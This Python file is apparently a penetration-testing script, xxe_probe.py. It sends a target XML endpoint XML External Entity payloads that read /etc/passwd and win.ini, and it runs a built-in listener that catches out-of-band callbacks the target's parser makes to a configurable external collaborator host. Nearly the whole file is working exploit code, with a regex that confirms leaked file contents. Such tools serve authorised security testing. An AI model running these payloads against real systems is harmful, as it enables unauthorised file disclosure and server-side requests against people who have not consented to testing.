#!/usr/bin/env python
"""xxe_probe.py — XML External Entity (XXE) battery with a built-in OOB collaborator.

Sends an XML endpoint a battery of XXE payloads and detects:
  - in-band file read (file content reflected in the response), and
  - blind/OOB (the server-side parser calls back to our local collaborator listener).
Non-destructive: no billion-laughs / entity-expansion DoS (RoE). For a real
external target the collaborator must be internet-reachable (--collab-host); for
localhost labs the default 127.0.0.1 listener suffices.

XXE only fires against an endpoint that PARSES user-supplied XML with external
entities enabled (Java/PHP/.NET/libxml) — many apps don't, so "not vulnerable"
here often means "no XML sink", which is honest coverage, not a miss.

Usage:
  python xxe_probe.py <xml-endpoint-url> [--collab-host <ip>] [--collab-port 0] [--content-type application/xml]
"""
import sys, re, json, ssl, time, uuid, argparse, threading, urllib.request, urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
HITS = []

class Collab(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        HITS.append(self.path)
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers()
        self.wfile.write(b"ok")

def start_collab(port=0):
    srv = ThreadingHTTPServer(("127.0.0.1", port), Collab)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]

def post_xml(url, body, ctype, timeout=15):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, data=body.encode(), headers={"User-Agent": UA, "Content-Type": ctype})
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.getcode(), r.read(50000).decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(50000).decode("latin-1", "replace") if hasattr(e, "read") else "")
    except Exception as e:
        return None, str(e)

def probe(url, collab_host, collab_port, ctype):
    url = url.replace("//localhost", "//127.0.0.1")
    _, port = start_collab(collab_port)
    host = collab_host or "127.0.0.1"
    token = uuid.uuid4().hex[:12]
    oob = f"http://{host}:{port}/xxe-{token}"
    payloads = {
        "in-band-unix": f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        "in-band-win":  f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
        "oob-http":     f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{oob}">]><r>&x;</r>',
    }
    results, findings = [], []
    for name, body in payloads.items():
        status, resp = post_xml(url, body, ctype)
        inband = bool(re.search(r"root:.*:0:0:|\[fonts\]|\[extensions\]", resp or "", re.I))
        results.append({"payload": name, "status": status, "inband_file_read": inband})
        if inband:
            findings.append({"id": "xxe-inband-file-read", "severity": "high", "cwe": "CWE-611",
                             "location": url, "detail": f"in-band XXE file read confirmed ({name})"})
    time.sleep(1.0)  # allow async OOB callbacks
    oob_hit = any(token in h for h in HITS)
    if oob_hit:
        findings.append({"id": "xxe-oob", "severity": "high", "cwe": "CWE-611", "location": url,
                         "detail": "blind/OOB XXE confirmed — server-side parser called back to the collaborator"})
    return {"target": url, "ok": True, "collaborator": oob, "results": results,
            "oob_callback": oob_hit, "findings": findings,
            "note": ("XXE requires an XML sink with external entities enabled; no hit often = no XML sink. "
                     "For external targets use --collab-host with an internet-reachable IP.")}

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("url"); ap.add_argument("--collab-host"); ap.add_argument("--collab-port", type=int, default=0)
    ap.add_argument("--content-type", default="application/xml")
    a = ap.parse_args()
    print(json.dumps(probe(a.url, a.collab_host, a.collab_port, a.content_type), indent=2))
